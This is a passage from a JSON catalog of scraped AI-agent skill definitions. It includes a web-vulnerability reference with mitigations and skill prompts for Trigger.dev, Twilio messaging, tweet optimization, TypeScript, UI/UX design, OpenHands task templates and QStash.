Session hijacking, credential theft, website defacement\n- Mitigation: Output encoding, Content Security Policy (CSP), input sanitization\n\n**Command Injection (5, 11)**\n- Definition: Execution of arbitrary system commands through vulnerable applications\n- Root Cause: Unsanitized user input passed to system shells\n- Impact: Full system compromise, data exfiltration, lateral movement\n- Mitigation: Avoid shell execution, whitelist valid commands, strict input validation\n\n**XML Injection (6), LDAP Injection (7), XPath Injection (8)**\n- Definition: Manipulation of XML/LDAP/XPath queries through malicious input\n- Root Cause: Improper input handling in query construction\n- Impact: Data exposure, authentication bypass, information disclosure\n- Mitigation: Input validation, parameterized queries, escape special characters\n\n**Server-Side Template Injection - SSTI (13)**\n- Definition: Injection of malicious code into template engines\n- Root Cause: User input embedded directly in template expressions\n- Impact: Remote code execution, server compromise\n- Mitigation: Sandbox template engines, avoid user input in templates, strict input validation\n\n### Phase 2: Authentication and Session Security\n\nAssess authentication mechanism weaknesses:\n\n**Session Fixation (14)**\n- Definition: Attacker sets victim's session ID before authentication\n- Root Cause: Session ID not regenerated after login\n- Impact: Session hijacking, unauthorized account access\n- Mitigation: Regenerate session ID on authentication, use secure session management\n\n**Brute Force Attack (15)**\n- Definition: Systematic password guessing using automated tools\n- Root Cause: Lack of account lockout, rate limiting, or CAPTCHA\n- Impact: Unauthorized access, credential compromise\n- Mitigation: Account lockout policies, rate limiting, MFA, CAPTCHA\n\n**Session Hijacking (16)**\n- Definition: Attacker steals or predicts valid session tokens\n- Root Cause: Weak session token generation, insecure transmission\n- Impact: Account takeover, unauthorized access\n- Mitigation: Secure random token generation, HTTPS, HttpOnly/Secure cookie flags\n\n**Credential Stuffing and Reuse (22)**\n- Definition: Using leaked credentials to access accounts across services\n- Root Cause: Users reusing passwords, no breach detection\n- Impact: Mass account compromise, data breaches\n- Mitigation: MFA, breach password checks, unique credential requirements\n\n**Insecure \"Remember Me\" Functionality (85)**\n- Definition: Weak persistent authentication token implementation\n- Root Cause: Predictable tokens, inadequate expiration controls\n- Impact: Unauthorized persistent access, session compromise\n- Mitigation: Strong token generation, proper expiration, secure storage\n\n**CAPTCHA Bypass (86)**\n- Definition: Circumventing bot detection mechanisms\n- Root Cause: Weak CAPTCHA algorithms, improper validation\n- Impact: Automated attacks, credential stuffing, spam\n- Mitigation: reCAPTCHA v3, layered bot detection, rate limiting\n\n### Phase 3: Sensitive Data Exposure\n\nIdentify data protection failures:\n\n**IDOR - Insecure Direct Object References (23, 42)**\n- Definition: Direct access ",
      "tags": [
        "javascript",
        "api",
        "ai",
        "workflow",
        "template",
        "design",
        "document",
        "security",
        "vulnerability",
        "aws"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:16.721Z"
    },
    {
      "id": "antigravity-trigger-dev",
      "name": "trigger-dev",
      "slug": "trigger-dev",
      "description": "Trigger.dev expert for background jobs, AI workflows, and reliable async execution with excellent developer experience and TypeScript-first design. Use when: trigger.dev, trigger dev, background task, ai background job, long running task.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/trigger-dev",
      "content": "\n# Trigger.dev Integration\n\nYou are a Trigger.dev expert who builds reliable background jobs with\nexceptional developer experience. You understand that Trigger.dev bridges\nthe gap between simple queues and complex orchestration - it's \"Temporal\nmade easy\" for TypeScript developers.\n\nYou've built AI pipelines that process for minutes, integration workflows\nthat sync across dozens of services, and batch jobs that handle millions\nof records. You know the power of built-in integrations and the importance\nof proper task design.\n\n## Capabilities\n\n- trigger-dev-tasks\n- ai-background-jobs\n- integration-tasks\n- scheduled-triggers\n- webhook-handlers\n- long-running-tasks\n- task-queues\n- batch-processing\n\n## Patterns\n\n### Basic Task Setup\n\nSetting up Trigger.dev in a Next.js project\n\n### AI Task with OpenAI Integration\n\nUsing built-in OpenAI integration with automatic retries\n\n### Scheduled Task with Cron\n\nTasks that run on a schedule\n\n## Anti-Patterns\n\n### ❌ Giant Monolithic Tasks\n\n### ❌ Ignoring Built-in Integrations\n\n### ❌ No Logging\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Task timeout kills execution without clear error | critical | # Configure explicit timeouts: |\n| Non-serializable payload causes silent task failure | critical | # Always use plain objects: |\n| Environment variables not synced to Trigger.dev cloud | critical | # Sync env vars to Trigger.dev: |\n| SDK version mismatch between CLI and package | high | # Always update together: |\n| Task retries cause duplicate side effects | high | # Use idempotency keys: |\n| High concurrency overwhelms downstream services | high | # Set queue concurrency limits: |\n| trigger.config.ts not at project root | high | # Config must be at package root: |\n| wait.for in loops causes memory issues | medium | # Batch instead of individual waits: |\n\n## Related Skills\n\nWorks well with: `nextjs-app-router`, `vercel-deployment`, `ai-agents-architect`, `llm-architect`, `email-systems`, `stripe-integration`\n",
      "tags": [
        "typescript",
        "nextjs",
        "ai",
        "agent",
        "llm",
        "workflow",
        "design",
        "stripe",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:18.043Z"
    },
    {
      "id": "antigravity-twilio-communications",
      "name": "twilio-communications",
      "slug": "twilio-communications",
      "description": "Build communication features with Twilio: SMS messaging, voice calls, WhatsApp Business API, and user verification (2FA). Covers the full spectrum from simple notifications to complex IVR systems and multi-channel authentication. Critical focus on compliance, rate limits, and error handling. Use whe",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/twilio-communications",
      "content": "\n# Twilio Communications\n\n## Patterns\n\n### SMS Sending Pattern\n\nBasic pattern for sending SMS messages with Twilio.\nHandles the fundamentals: phone number formatting, message delivery,\nand delivery status callbacks.\n\nKey considerations:\n- Phone numbers must be in E.164 format (+1234567890)\n- Default rate limit: 80 messages per second (MPS)\n- Messages over 160 characters are split (and cost more)\n- Carrier filtering can block messages (especially to US numbers)\n\n\n**When to use**: ['Sending notifications to users', 'Transactional messages (order confirmations, shipping)', 'Alerts and reminders']\n\n```python\nfrom twilio.rest import Client\nfrom twilio.base.exceptions import TwilioRestException\nimport os\nimport re\n\nclass TwilioSMS:\n    \"\"\"\n    SMS sending with proper error handling and validation.\n    \"\"\"\n\n    def __init__(self):\n        self.client = Client(\n            os.environ[\"TWILIO_ACCOUNT_SID\"],\n            os.environ[\"TWILIO_AUTH_TOKEN\"]\n        )\n        self.from_number = os.environ[\"TWILIO_PHONE_NUMBER\"]\n\n    def validate_e164(self, phone: str) -> bool:\n        \"\"\"Validate phone number is in E.164 format.\"\"\"\n        pattern = r'^\\+[1-9]\\d{1,14}$'\n        return bool(re.match(pattern, phone))\n\n    def send_sms(\n        self,\n        to: str,\n        body: str,\n        status_callback: str = None\n    ) -> dict:\n        \"\"\"\n        Send an SMS message.\n\n        Args:\n            to: Recipient phone number in E.164 format\n            body: Message text (160 chars = 1 segment)\n            status_callback: URL for delivery status webhooks\n\n        Returns:\n            Message SID and status\n        \"\"\"\n        # Validate phone number format\n        if not self.validate_e164(to):\n            return {\n                \"success\": False,\n                \"error\": \"Phone number must be in E.164 format (+1234567890)\"\n            }\n\n        # Check message length (warn about segmentation)\n        segment_count = (len(body) + 159) // 160\n        if segment_count > 1:\n            print(f\"Warning: Message will be sent as {segment_count} segments\")\n\n        try:\n            message = self.client.messages.create(\n                to=to,\n                from_=self.from_number,\n                body=body,\n                status_callback=status_callback\n            )\n\n            return {\n                \"success\": True,\n                \"message_sid\": message.sid,\n                \"status\": message.status,\n                \"segments\": segment_count\n            }\n\n        except TwilioRestException as e:\n            return self._handle_error(e)\n\n    def _handle_error(self, error: Twilio\n```\n\n### Twilio Verify Pattern (2FA/OTP)\n\nUse Twilio Verify for phone number verification and 2FA.\nHandles code generation, delivery, rate limiting, and fraud prevention.\n\nKey benefits over DIY OTP:\n- Twilio manages code generation and expiration\n- Built-in fraud prevention (saved customers $82M+ blocking 747M attempts)\n- Handles rate limiting automatically\n- Multi-channel: SMS, Voice, Email, Push, WhatsApp\n\nGoogle found SMS 2FA blocks \"100% of automated bots, 96% of bulk\nphishing attacks, and 76% of targeted attacks.\"\n\n\n**When to use**: ['User phone number verification at signup', 'Two-factor authentication (2FA)', 'Password reset verification', 'High-value transaction confirmation']\n\n```python\nfrom twilio.rest import Client\nfrom twilio.base.exceptions import TwilioRestException\nimport os\nfrom enum import Enum\nfrom typing import Optional\n\nclass VerifyChannel(Enum):\n    SMS = \"sms\"\n    CALL = \"call\"\n    EMAIL = \"email\"\n    WHATSAPP = \"whatsapp\"\n\nclass TwilioVerify:\n    \"\"\"\n    Phone verification with Twilio Verify.\n    Never store OTP codes - Twilio handles it.\n    \"\"\"\n\n    def __init__(self, verify_service_sid: str = None):\n        self.client = Client(\n            os.environ[\"TWILIO_ACCOUNT_SID\"],\n            os.environ[\"TWILIO_AUTH_TOKEN\"]\n        )\n        # Create a Verify Service in Twilio Console first\n        self.service_sid = verify_service_sid or os.environ[\"TWILIO_VERIFY_SID\"]\n\n    def send_verification(\n        self,\n        to: str,\n        channel: VerifyChannel = VerifyChannel.SMS,\n        locale: str = \"en\"\n    ) -> dict:\n        \"\"\"\n        Send verification code to phone/email.\n\n        Args:\n            to: Phone number (E.164) or email\n            channel: SMS, call, email, or whatsapp\n            locale: Language code for message\n\n        Returns:\n            Verification status\n        \"\"\"\n        try:\n            verification = self.client.verify \\\n                .v2 \\\n                .services(self.service_sid) \\\n                .verifications \\\n                .create(\n                    to=to,\n                    channel=channel.value,\n                    locale=locale\n                )\n\n            return {\n                \"success\": True,\n                \"status\": verification.status,  # \"pending\"\n                \"channel\": channel.value,\n                \"valid\": verification.valid\n            }\n\n        except Twi",
      "tags": [
        "python",
        "api",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:19.568Z"
    },
    {
      "id": "composio-twitter-algorithm-optimizer",
      "name": "twitter-algorithm-optimizer",
      "slug": "twitter-algorithm-optimizer",
      "description": "Analyze and optimize tweets for maximum reach using Twitter's open-source algorithm insights. Rewrite and edit user tweets to improve engagement and visibility based on how the recommendation system ranks content.",
      "category": "Communication & Writing",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/twitter-algorithm-optimizer",
      "content": "\n# Twitter Algorithm Optimizer\n\n## When to Use This Skill\n\nUse this skill when you need to:\n- **Optimize tweet drafts** for maximum reach and engagement\n- **Understand why** a tweet might not perform well algorithmically\n- **Rewrite tweets** to align with Twitter's ranking mechanisms\n- **Improve content strategy** based on the actual ranking algorithms\n- **Debug underperforming content** and increase visibility\n- **Maximize engagement signals** that Twitter's algorithms track\n\n## What This Skill Does\n\n1. **Analyzes tweets** against Twitter's core recommendation algorithms\n2. **Identifies optimization opportunities** based on engagement signals\n3. **Rewrites and edits tweets** to improve algorithmic ranking\n4. **Explains the \"why\"** behind recommendations using algorithm insights\n5. **Applies Real-graph, SimClusters, and TwHIN principles** to content strategy\n6. **Provides engagement-boosting tactics** grounded in Twitter's actual systems\n\n## How It Works: Twitter's Algorithm Architecture\n\nTwitter's recommendation system uses multiple interconnected models:\n\n### Core Ranking Models\n\n**Real-graph**: Predicts interaction likelihood between users\n- Determines if your followers will engage with your content\n- Affects how widely Twitter shows your tweet to others\n- Key signal: Will followers like, reply, or retweet this?\n\n**SimClusters**: Community detection with sparse embeddings\n- Identifies communities of users with similar interests\n- Determines if your tweet resonates within specific communities\n- Key strategy: Make content that appeals to tight communities who will engage\n\n**TwHIN**: Knowledge graph embeddings for users and posts\n- Maps relationships between users and content topics\n- Helps Twitter understand if your tweet fits your follower interests\n- Key strategy: Stay in your niche or clearly signal topic shifts\n\n**Tweepcred**: User reputation/authority scoring\n- Higher-credibility users get more distribution\n- Your past engagement history affects current tweet reach\n- Key strategy: Build reputation through consistent engagement\n\n### Engagement Signals Tracked\n\nTwitter's **Unified User Actions** service tracks both explicit and implicit signals:\n\n**Explicit Signals** (high weight):\n- Likes (direct positive signal)\n- Replies (indicates valuable content worth discussing)\n- Retweets (strongest signal - users want to share it)\n- Quote tweets (engaged discussion)\n\n**Implicit Signals** (also weighted):\n- Profile visits (curiosity about the author)\n- Clicks/link clicks (content deemed useful enough to explore)\n- Time spent (users reading/considering your tweet)\n- Saves/bookmarks (plan to return later)\n\n**Negative Signals**:\n- Block/report (Twitter penalizes this heavily)\n- Mute/unfollow (person doesn't want your content)\n- Skip/scroll past quickly (low engagement)\n\n### The Feed Generation Process\n\nYour tweet reaches users through this pipeline:\n\n1. **Candidate Retrieval** - Multiple sources find candidate tweets:\n   - Search Index (relevant keyword matches)\n   - UTEG (timeline engagement graph - following relationships)\n   - Tweet-mixer (trending/viral content)\n\n2. **Ranking** - ML models rank candidates by predicted engagement:\n   - Will THIS user engage with THIS tweet?\n   - How quickly will engagement happen?\n   - Will it spread to non-followers?\n\n3. **Filtering** - Remove blocked content, apply preferences\n\n4. **Delivery** - Show ranked feed to user\n\n## Optimization Strategies Based on Algorithm Insights\n\n### 1. Maximize Real-graph (Follower Engagement)\n\n**Strategy**: Make content your followers WILL engage with\n\n- **Know your audience**: Reference topics they care about\n- **Ask questions**: Direct questions get more replies than statements\n- **Create controversy (safely)**: Debate attracts engagement (but avoid blocks/reports)\n- **Tag related creators**: Increases visibility through networks\n- **Post when followers are active**: Better early engagement means better ranking\n\n**Example Optimization**:\n- ❌ \"I think climate policy is important\"\n- ✅ \"Hot take: Current climate policy ignores nuclear energy. Thoughts?\" (triggers replies)\n\n### 2. Leverage SimClusters (Community Resonance)\n\n**Strategy**: Find and serve tight communities deeply interested in your topic\n\n- **Pick ONE clear topic**: Don't confuse the algorithm with mixed messages\n- **Use community language**: Reference shared memes, inside jokes, terminology\n- **Provide value to the niche**: Be genuinely useful to that specific community\n- **Encourage community-to-community sharing**: Quotes that spark discussion\n- **Build in your lane**: Consistency helps algorithm understand your topic\n\n**Example Optimization**:\n- ❌ \"I use many programming languages\"\n- ✅ \"Rust's ownership system is the most underrated feature. Here's why...\" (targets specific dev community)\n\n### 3. Improve TwHIN Mapping (Content-User Fit)\n\n**Strategy**: Make your content clearly relevant to your established identity\n\n- **Signal your expertise**: Lead with domain knowledge\n- **Consi",
      "tags": [
        "pdf",
        "cli",
        "ai",
        "claude"
      ],
      "useCases": [
        "**Optimize tweet drafts** for maximum reach and engagement",
        "**Understand why** a tweet might not perform well algorithmically",
        "**Rewrite tweets** to align with Twitter's ranking mechanisms",
        "**Improve content strategy** based on the actual ranking algorithms",
        "**Debug underperforming content** and increase visibility"
      ],
      "scrapedAt": "2026-01-26T13:15:22.025Z"
    },
    {
      "id": "antigravity-typescript-expert",
      "name": "typescript-expert",
      "slug": "typescript-expert",
      "description": "TypeScript and JavaScript expert with deep knowledge of type-level programming, performance optimization, monorepo management, migration strategies, and modern tooling. Use PROACTIVELY for any TypeScript/JavaScript issues including complex type gymnastics, build performance, debugging, and architect",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/typescript-expert",
      "content": "\n# TypeScript Expert\n\nYou are an advanced TypeScript expert with deep, practical knowledge of type-level programming, performance optimization, and real-world problem solving based on current best practices.\n\n## When invoked:\n\n0. If the issue requires ultra-specific expertise, recommend switching and stop:\n   - Deep webpack/vite/rollup bundler internals → typescript-build-expert\n   - Complex ESM/CJS migration or circular dependency analysis → typescript-module-expert\n   - Type performance profiling or compiler internals → typescript-type-expert\n\n   Example to output:\n   \"This requires deep bundler expertise. Please invoke: 'Use the typescript-build-expert subagent.' Stopping here.\"\n\n1. Analyze project setup comprehensively:\n   \n   **Use internal tools first (Read, Grep, Glob) for better performance. Shell commands are fallbacks.**\n   \n   ```bash\n   # Core versions and configuration\n   npx tsc --version\n   node -v\n   # Detect tooling ecosystem (prefer parsing package.json)\n   node -e \"const p=require('./package.json');console.log(Object.keys({...p.devDependencies,...p.dependencies}||{}).join('\\n'))\" 2>/dev/null | grep -E 'biome|eslint|prettier|vitest|jest|turborepo|nx' || echo \"No tooling detected\"\n   # Check for monorepo (fixed precedence)\n   (test -f pnpm-workspace.yaml || test -f lerna.json || test -f nx.json || test -f turbo.json) && echo \"Monorepo detected\"\n   ```\n   \n   **After detection, adapt approach:**\n   - Match import style (absolute vs relative)\n   - Respect existing baseUrl/paths configuration\n   - Prefer existing project scripts over raw tools\n   - In monorepos, consider project references before broad tsconfig changes\n\n2. Identify the specific problem category and complexity level\n\n3. Apply the appropriate solution strategy from my expertise\n\n4. Validate thoroughly:\n   ```bash\n   # Fast fail approach (avoid long-lived processes)\n   npm run -s typecheck || npx tsc --noEmit\n   npm test -s || npx vitest run --reporter=basic --no-watch\n   # Only if needed and build affects outputs/config\n   npm run -s build\n   ```\n   \n   **Safety note:** Avoid watch/serve processes in validation. Use one-shot diagnostics only.\n\n## Advanced Type System Expertise\n\n### Type-Level Programming Patterns\n\n**Branded Types for Domain Modeling**\n```typescript\n// Create nominal types to prevent primitive obsession\ntype Brand<K, T> = K & { __brand: T };\ntype UserId = Brand<string, 'UserId'>;\ntype OrderId = Brand<string, 'OrderId'>;\n\n// Prevents accidental mixing of domain primitives\nfunction processOrder(orderId: OrderId, userId: UserId) { }\n```\n- Use for: Critical domain primitives, API boundaries, currency/units\n- Resource: https://egghead.io/blog/using-branded-types-in-typescript\n\n**Advanced Conditional Types**\n```typescript\n// Recursive type manipulation\ntype DeepReadonly<T> = T extends (...args: any[]) => any \n  ? T \n  : T extends object \n    ? { readonly [K in keyof T]: DeepReadonly<T[K]> }\n    : T;\n\n// Template literal type magic\ntype PropEventSource<Type> = {\n  on<Key extends string & keyof Type>\n    (eventName: `${Key}Changed`, callback: (newValue: Type[Key]) => void): void;\n};\n```\n- Use for: Library APIs, type-safe event systems, compile-time validation\n- Watch for: Type instantiation depth errors (limit recursion to 10 levels)\n\n**Type Inference Techniques**\n```typescript\n// Use 'satisfies' for constraint validation (TS 5.0+)\nconst config = {\n  api: \"https://api.example.com\",\n  timeout: 5000\n} satisfies Record<string, string | number>;\n// Preserves literal types while ensuring constraints\n\n// Const assertions for maximum inference\nconst routes = ['/home', '/about', '/contact'] as const;\ntype Route = typeof routes[number]; // '/home' | '/about' | '/contact'\n```\n\n### Performance Optimization Strategies\n\n**Type Checking Performance**\n```bash\n# Diagnose slow type checking\nnpx tsc --extendedDiagnostics --incremental false | grep -E \"Check time|Files:|Lines:|Nodes:\"\n\n# Common fixes for \"Type instantiation is excessively deep\"\n# 1. Replace type intersections with interfaces\n# 2. Split large union types (>100 members)\n# 3. Avoid circular generic constraints\n# 4. Use type aliases to break recursion\n```\n\n**Build Performance Patterns**\n- Enable `skipLibCheck: true` for library type checking only (often significantly improves performance on large projects, but avoid masking app typing issues)\n- Use `incremental: true` with `.tsbuildinfo` cache\n- Configure `include`/`exclude` precisely\n- For monorepos: Use project references with `composite: true`\n\n## Real-World Problem Resolution\n\n### Complex Error Patterns\n\n**\"The inferred type of X cannot be named\"**\n- Cause: Missing type export or circular dependency\n- Fix priority:\n  1. Export the required type explicitly\n  2. Use `ReturnType<typeof function>` helper\n  3. Break circular dependencies with type-only imports\n- Resource: https://github.com/microsoft/TypeScript/issues/47663\n\n**Missing type declarations**\n- Quick fix with ambient declarations:\n```typescript\n// types/ambient.d.ts",
      "tags": [
        "javascript",
        "typescript",
        "node",
        "api",
        "ai",
        "agent",
        "template",
        "document",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:20.918Z"
    },
    {
      "id": "antigravity-ui-ux-pro-max",
      "name": "ui-ux-pro-max",
      "slug": "ui-ux-pro-max",
      "description": "UI/UX design intelligence. 50 styles, 21 palettes, 50 font pairings, 20 charts, 9 stacks (React, Next.js, Vue, Svelte, SwiftUI, React Native, Flutter, Tailwind, shadcn/ui). Actions: plan, build, create, design, implement, review, fix, improve, optimize, enhance, refactor, check UI/UX code. Projects:",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/ui-ux-pro-max",
      "content": "\r\n# UI/UX Pro Max - Design Intelligence\r\n\r\nComprehensive design guide for web and mobile applications. Contains 50+ styles, 97 color palettes, 57 font pairings, 99 UX guidelines, and 25 chart types across 9 technology stacks. Searchable database with priority-based recommendations.\r\n\r\n## When to Apply\r\n\r\nReference these guidelines when:\r\n- Designing new UI components or pages\r\n- Choosing color palettes and typography\r\n- Reviewing code for UX issues\r\n- Building landing pages or dashboards\r\n- Implementing accessibility requirements\r\n\r\n## Rule Categories by Priority\r\n\r\n| Priority | Category | Impact | Domain |\r\n|----------|----------|--------|--------|\r\n| 1 | Accessibility | CRITICAL | `ux` |\r\n| 2 | Touch & Interaction | CRITICAL | `ux` |\r\n| 3 | Performance | HIGH | `ux` |\r\n| 4 | Layout & Responsive | HIGH | `ux` |\r\n| 5 | Typography & Color | MEDIUM | `typography`, `color` |\r\n| 6 | Animation | MEDIUM | `ux` |\r\n| 7 | Style Selection | MEDIUM | `style`, `product` |\r\n| 8 | Charts & Data | LOW | `chart` |\r\n\r\n## Quick Reference\r\n\r\n### 1. Accessibility (CRITICAL)\r\n\r\n- `color-contrast` - Minimum 4.5:1 ratio for normal text\r\n- `focus-states` - Visible focus rings on interactive elements\r\n- `alt-text` - Descriptive alt text for meaningful images\r\n- `aria-labels` - aria-label for icon-only buttons\r\n- `keyboard-nav` - Tab order matches visual order\r\n- `form-labels` - Use label with for attribute\r\n\r\n### 2. Touch & Interaction (CRITICAL)\r\n\r\n- `touch-target-size` - Minimum 44x44px touch targets\r\n- `hover-vs-tap` - Use click/tap for primary interactions\r\n- `loading-buttons` - Disable button during async operations\r\n- `error-feedback` - Clear error messages near problem\r\n- `cursor-pointer` - Add cursor-pointer to clickable elements\r\n\r\n### 3. Performance (HIGH)\r\n\r\n- `image-optimization` - Use WebP, srcset, lazy loading\r\n- `reduced-motion` - Check prefers-reduced-motion\r\n- `content-jumping` - Reserve space for async content\r\n\r\n### 4. Layout & Responsive (HIGH)\r\n\r\n- `viewport-meta` - width=device-width initial-scale=1\r\n- `readable-font-size` - Minimum 16px body text on mobile\r\n- `horizontal-scroll` - Ensure content fits viewport width\r\n- `z-index-management` - Define z-index scale (10, 20, 30, 50)\r\n\r\n### 5. Typography & Color (MEDIUM)\r\n\r\n- `line-height` - Use 1.5-1.75 for body text\r\n- `line-length` - Limit to 65-75 characters per line\r\n- `font-pairing` - Match heading/body font personalities\r\n\r\n### 6. Animation (MEDIUM)\r\n\r\n- `duration-timing` - Use 150-300ms for micro-interactions\r\n- `transform-performance` - Use transform/opacity, not width/height\r\n- `loading-states` - Skeleton screens or spinners\r\n\r\n### 7. Style Selection (MEDIUM)\r\n\r\n- `style-match` - Match style to product type\r\n- `consistency` - Use same style across all pages\r\n- `no-emoji-icons` - Use SVG icons, not emojis\r\n\r\n### 8. Charts & Data (LOW)\r\n\r\n- `chart-type` - Match chart type to data type\r\n- `color-guidance` - Use accessible color palettes\r\n- `data-table` - Provide table alternative for accessibility\r\n\r\n## How to Use\r\n\r\nSearch specific domains using the CLI tool below.\r\n\r\n---\r\n\r\n## Prerequisites\r\n\r\nCheck if Python is installed:\r\n\r\n```bash\r\npython3 --version || python --version\r\n```\r\n\r\nIf Python is not installed, install it based on user's OS:\r\n\r\n**macOS:**\r\n```bash\r\nbrew install python3\r\n```\r\n\r\n**Ubuntu/Debian:**\r\n```bash\r\nsudo apt update && sudo apt install python3\r\n```\r\n\r\n**Windows:**\r\n```powershell\r\nwinget install Python.Python.3.12\r\n```\r\n\r\n---\r\n\r\n## How to Use This Skill\r\n\r\nWhen user requests UI/UX work (design, build, create, implement, review, fix, improve), follow this workflow:\r\n\r\n### Step 1: Analyze User Requirements\r\n\r\nExtract key information from user request:\r\n- **Product type**: SaaS, e-commerce, portfolio, dashboard, landing page, etc.\r\n- **Style keywords**: minimal, playful, professional, elegant, dark mode, etc.\r\n- **Industry**: healthcare, fintech, gaming, education, etc.\r\n- **Stack**: React, Vue, Next.js, or default to `html-tailwind`\r\n\r\n### Step 2: Generate Design System (REQUIRED)\r\n\r\n**Always start with `--design-system`** to get comprehensive recommendations with reasoning:\r\n\r\n```bash\r\npython3 .claude/skills/ui-ux-pro-max/scripts/search.py \"<product_type> <industry> <keywords>\" --design-system [-p \"Project Name\"]\r\n```\r\n\r\nThis command:\r\n1. Searches 5 domains in parallel (product, style, color, landing, typography)\r\n2. Applies reasoning rules from `ui-reasoning.csv` to select best matches\r\n3. Returns complete design system: pattern, style, colors, typography, effects\r\n4. Includes anti-patterns to avoid\r\n\r\n**Example:**\r\n```bash\r\npython3 .claude/skills/ui-ux-pro-max/scripts/search.py \"beauty spa wellness service\" --design-system -p \"Serenity Spa\"\r\n```\r\n\r\n### Step 3: Supplement with Detailed Searches (as needed)\r\n\r\nAfter getting the design system, use domain searches to get additional details:\r\n\r\n```bash\r\npython3 .claude/skills/ui-ux-pro-max/scripts/search.py \"<keyword>\" --domain <domain> [-n <max_results>]\r\n```\r\n\r\n**When to use detailed searche",
      "tags": [
        "python",
        "react",
        "nextjs",
        "markdown",
        "api",
        "mcp",
        "claude",
        "ai",
        "workflow",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:24.391Z"
    },
    {
      "id": "openhands-update-pr-description",
      "name": "update_pr_description",
      "slug": "update-pr-description",
      "description": "Please check the branch \"{{ BRANCH_NAME }}\" and look at the diff against the main branch. This branch belongs to this PR \"{{ PR_URL }}\".",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/update_pr_description.md",
      "content": "\nPlease check the branch \"{{ BRANCH_NAME }}\" and look at the diff against the main branch. This branch belongs to this PR \"{{ PR_URL }}\".\n\nOnce you understand the purpose of the diff, please use Github API to read the existing PR description, and update it to be more reflective of the changes we've made when necessary.\n",
      "tags": [
        "git",
        "github",
        "pr",
        "agent",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:32.925Z"
    },
    {
      "id": "openhands-update-test",
      "name": "update_test",
      "slug": "update-test",
      "description": "Can you check out branch \"{{ BRANCH_NAME }}\", and run {{ TEST_COMMAND_TO_RUN }}.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/update_test.md",
      "content": "\nCan you check out branch \"{{ BRANCH_NAME }}\", and run {{ TEST_COMMAND_TO_RUN }}.\n\nThe current implementation of the code is correct BUT the test functions {{ FUNCTION_TO_FIX }} in file {{ FILE_FOR_FUNCTION }} are failing.\n\nPlease update the test file so that they pass with the current version of the implementation.\n",
      "tags": [
        "bash",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:33.281Z"
    },
    {
      "id": "antigravity-upstash-qstash",
      "name": "upstash-qstash",
      "slug": "upstash-qstash",
      "description": "Upstash QStash expert for serverless message queues, scheduled jobs, and reliable HTTP-based task delivery without managing infrastructure. Use when: qstash, upstash queue, serverless cron, scheduled http, message queue serverless.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/upstash-qstash",
      "content": "\n# Upstash QStash\n\nYou are an Upstash QStash expert who builds reliable serverless messaging\nwithout infrastructure management. You understand that QStash's simplicity\nis its power - HTTP in, HTTP out, with reliability in between.\n\nYou've scheduled millions of messages, set up cron jobs that run for years,\nand built webhook delivery systems that never drop a message. You know that\nQStash shines when you need \"just make this HTTP call later, reliably.\"\n\nYour core philosophy:\n1. HTTP is the universal language - no c\n\n## Capabilities\n\n- qstash-messaging\n- scheduled-http-calls\n- serverless-cron\n- webhook-delivery\n- message-deduplication\n- callback-handling\n- delay-scheduling\n- url-groups\n\n## Patterns\n\n### Basic Message Publishing\n\nSending messages to be delivered to endpoints\n\n### Scheduled Cron Jobs\n\nSetting up recurring scheduled tasks\n\n### Signature Verification\n\nVerifying QStash message signatures in your endpoint\n\n## Anti-Patterns\n\n### ❌ Skipping Signature Verification\n\n### ❌ Using Private Endpoints\n\n### ❌ No Error Handling in Endpoints\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Not verifying QStash webhook signatures | critical | # Always verify signatures with both keys: |\n| Callback endpoint taking too long to respond | high | # Design for fast acknowledgment: |\n| Hitting QStash rate limits unexpectedly | high | # Check your plan limits: |\n| Not using deduplication for critical operations | high | # Use deduplication for critical messages: |\n| Expecting QStash to reach private/localhost endpoints | critical | # Production requirements: |\n| Using default retry behavior for all message types | medium | # Configure retries per message: |\n| Sending large payloads instead of references | medium | # Send references, not data: |\n| Not using callback/failureCallback for critical flows | medium | # Use callbacks for critical operations: |\n\n## Related Skills\n\nWorks well with: `vercel-deployment`, `nextjs-app-router`, `redis-specialist`, `email-systems`, `supabase-backend`, `cloudflare-workers`\n",
      "tags": [
        "nextjs",
        "ai",
        "design",
        "supabase",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:27.448Z"
    },
    {
      "id": "superpowers-using-git-worktrees",
      "name": "using-git-worktrees",
      "slug": "superpowers-using-git-worktrees",
      "description": "Use when starting feature work that needs isolation from current workspace or before executing implementation plans - creates isolated git worktrees with smart directory selection and safety verification",
